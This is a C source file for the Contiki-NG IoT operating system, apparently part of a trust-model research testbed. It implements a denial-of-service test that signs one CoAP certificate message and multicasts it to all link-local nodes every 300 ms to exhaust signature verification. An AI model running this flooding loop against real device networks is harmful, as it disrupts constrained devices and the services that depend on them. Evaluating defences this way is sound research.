#include "contiki.h"
#include "sys/log.h"

#include "trust.h" // from node/trust

#include "coap.h"
#include "coap-callback-api.h"

#include "crypto-support.h"
#include "keystore.h"
#include "keystore-oscore.h"
/*-------------------------------------------------------------------------------------------------------------------*/
#ifndef DOS_CERTIFICATE_VERIFICATION_PERIOD_MS
#define DOS_CERTIFICATE_VERIFICATION_PERIOD_MS 300
#endif
/*-------------------------------------------------------------------------------------------------------------------*/
#define DOS_CERTIFICATE_VERIFICATION_PERIOD (clock_time_t)(DOS_CERTIFICATE_VERIFICATION_PERIOD_MS * CLOCK_SECOND / 1000)
/*-------------------------------------------------------------------------------------------------------------------*/
// Depending on what CLOCK_SECOND is set to, we run the risk of this being too low
_Static_assert(DOS_CERTIFICATE_VERIFICATION_PERIOD >= 1, "DOS_CERTIFICATE_VERIFICATION_PERIOD_MS is too low");
/*-------------------------------------------------------------------------------------------------------------------*/
#define LOG_MODULE "attack-dcv"
#define LOG_LEVEL LOG_LEVEL_DBG
/*-------------------------------------------------------------------------------------------------------------------*/
PROCESS(dos_certificate_verification, "dos_certificate_verification");
/*-------------------------------------------------------------------------------------------------------------------*/
// This attack will send a certificate with a signature generated from a valid key pair
// The aim is for this message to be sent often in order to DoS signature verification
// We create the signed message once and then send it often
/*-------------------------------------------------------------------------------------------------------------------*/
static coap_endpoint_t ep;
static coap_message_t msg;
static coap_callback_request_state_t coap_callback;
static uint8_t payload_buf[MAX_TRUST_PAYLOAD + DTLS_EC_SIG_SIZE];
/*-------------------------------------------------------------------------------------------------------------------*/
static struct etimer send_timer;
/*-------------------------------------------------------------------------------------------------------------------*/
static bool build_message(void)
{
    uip_create_linklocal_allnodes_mcast(&ep.ipaddr);
    ep.secure = 0;
    ep.port = UIP_HTONS(COAP_DEFAULT_PORT);

    // This is a non-confirmable message
    coap_init_message(&msg, COAP_TYPE_NON, COAP_POST, 0);
    coap_set_header_content_format(&msg, APPLICATION_CBOR);
    coap_set_header_uri_path(&msg, TRUST_COAP_URI);

#if defined(WITH_OSCORE) && defined(WITH_GROUPCOM)
#   error "This test will not work with Group OSCORE"
    coap_set_random_token(&msg);
    keystore_protect_coap_with_oscore(&msg, &item->ep);
#endif

    int payload_len = serialise_trust(NULL, payload_buf, MAX_TRUST_PAYLOAD);
    if (payload_len <= 0 || payload_len > MAX_TRUST_PAYLOAD)
    {
        LOG_ERR("serialise_trust failed %d\n", payload_len);
        return false;
    }

    if (!queue_message_to_sign(&dos_certificate_verification, payload_buf, payload_buf, sizeof(payload_buf), payload_len))
    {
        LOG_ERR("trust periodic_action: Unable to sign message\n");
        return false;
    }

    return true;
}
/*-------------------------------------------------------------------------------------------------------------------*/
static bool build_message_continue(void* data)
{
    messages_to_sign_entry_t* entry = (messages_to_sign_entry_t*)data;

    if (entry->data != payload_buf)
    {
        LOG_ERR("build_message_continue for wrong message\n");
        return false;
    }

    if (entry->result == PKA_STATUS_SUCCESS)
    {
        int payload_len = entry->message_len + DTLS_EC_SIG_SIZE;
        int coap_payload_len = coap_set_payload(&msg, payload_buf, payload_len);
        if (coap_payload_len < payload_len)
        {
            LOG_WARN("Messaged length truncated to = %d\n", coap_payload_len);
        }
    }
    else
    {
        LOG_ERR("Sign of trust information failed %d\n", entry->result);
        return false;
    }

    queue_message_to_sign_done(entry);

    return true;
}
/*-------------------------------------------------------------------------------------------------------------------*/
PROCESS_THREAD(dos_certificate_verification, ev, data)
{
    PROCESS_BEGIN();

    LOG_INFO("Starting %s\n", PROCESS_NAME_STRING(PROCESS_CURRENT()));

    if (!build_message())
    {
        LOG_ERR("Failed to build the message to send, quitting test\n");
        PROCESS_EXIT();
    }

    PROCESS_WAIT_EVENT_UNTIL(ev == pe_message_signed);

    if (!build_message_continue(data))
    {
        LOG_ERR("Failed to create a signed message, quitting test\n");
        PROCESS_EXIT();
    }

    LOG_INFO("Message has been created, starting to send periodically "
             "every " CC_STRINGIFY(DOS_CERTIFICATE_VERIFICATION_PERIOD_MS) "ms (%" PRIu32 " clock ticks)\n",
             DOS_CERTIFICATE_VERIFICATION_PERIOD);

    etimer_set(&send_timer, DOS_CERTIFICATE_VERIFICATION_PERIOD);

    // Send the message periodically
    while (1)
    {
        PROCESS_WAIT_EVENT_UNTIL(ev == PROCESS_EVENT_TIMER && data == &send_timer);

        LOG_DBG("coap_send_request dos_certificate_verification start\n");

        // No callback is set, as no confirmation of the message being received will be sent to us
        int ret = coap_send_request(&coap_callback, &ep, &msg, NULL);
        if (ret)
        {
            LOG_DBG("coap_send_request dos_certificate_verification done\n");
        }
        else
        {
            LOG_ERR("coap_send_request dos_certificate_verification failed %d\n", ret);
        }

        etimer_reset(&send_timer);
    }

    PROCESS_END();
}
/*-------------------------------------------------------------------------------------------------------------------*/
